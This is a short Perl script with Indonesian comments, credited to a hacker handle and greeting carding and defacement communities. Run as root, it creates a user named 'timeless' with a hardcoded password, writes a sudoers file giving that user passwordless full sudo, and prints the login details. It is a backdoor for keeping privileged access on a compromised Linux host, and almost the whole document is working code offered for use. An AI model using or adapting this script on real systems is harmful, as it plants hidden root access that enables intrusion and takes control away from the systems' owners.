#!/usr/bin/perl
use strict;
use warnings;

# code by x0r
# mau di edit ? silahkan bebas :)
# thanks to : mner ifan,ikrar,troy and old team
# hacking guru : cr4wler
# Manadocoding - Yogyacarderlink - securityonline - hikaricommunity
# exploit-db - offensive - zone-h

# ===== CONFIG =====
my $username = "timeless";
my $password = "P4ssw0rdxxx";
my $shell    = "/bin/bash";
my $sudoers  = "/etc/sudoers.d/$username";
# ==================

# Cek root
if ($> != 0) {
    die "Script harus dijalankan sebagai root!\n";
}

# Cek user sudah ada
my $check = system("id $username > /dev/null 2>&1");
if ($check == 0) {
    die "User $username sudah ada!\n";
}

print "Membuat user $username...\n";

# Create user
system("useradd -m -s $shell $username") == 0
    or die "Gagal membuat user\n";

# Set password
open(my $fh, "|-", "chpasswd") or die "Gagal set password\n";
print $fh "$username:$password\n";
close($fh);

# Tambah ke sudo group
if (-d "/etc/sudoers.d") {
    open(my $sfh, ">", $sudoers) or die "Gagal membuat sudoers file\n";
    print $sfh "$username ALL=(ALL) NOPASSWD:ALL\n";
    close($sfh);
    chmod 0440, $sudoers;
} else {
    system("usermod -aG sudo $username");
}

print "User $username berhasil dibuat!\n";
print "Login: $username\n";
print "Password: $password\n";
print "Akses: FULL SUDO\n";

